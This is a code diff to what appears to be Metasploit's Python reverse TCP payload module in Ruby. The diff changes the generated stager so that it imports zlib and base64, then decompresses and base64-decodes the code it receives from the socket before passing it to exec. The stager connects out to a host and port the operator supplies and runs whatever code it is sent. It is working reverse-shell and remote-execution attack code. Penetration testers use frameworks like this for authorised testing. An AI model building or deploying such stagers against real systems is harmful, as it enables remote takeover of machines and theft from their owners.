@@ -1,8 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/python/send_uuid'
-
 module Msf
 
 ###
@@ -49,7 +46,7 @@ module Payload::Python::ReverseTcp
 
   def generate_reverse_tcp(opts={})
     # Set up the socket
-    cmd  = "import socket,struct#{opts[:retry_wait].to_i > 0 ? ',time' : ''}\n"
+    cmd  = "import socket,zlib,base64,struct#{opts[:retry_wait].to_i > 0 ? ',time' : ''}\n"
     if opts[:retry_wait].blank? # do not retry at all (old style)
       cmd << "s=socket.socket(2,socket.SOCK_STREAM)\n" # socket.AF_INET = 2
       cmd << "s.connect(('#{opts[:host]}',#{opts[:port]}))\n"
@@ -75,7 +72,7 @@ module Payload::Python::ReverseTcp
     cmd << "d=s.recv(l)\n"
     cmd << "while len(d)<l:\n"
     cmd << "\td+=s.recv(l-len(d))\n"
-    cmd << "exec(d,{'s':s})\n"
+    cmd << "exec(zlib.decompress(base64.b64decode(d)),{'s':s})\n"
 
     py_create_exec_stub(cmd)
   end
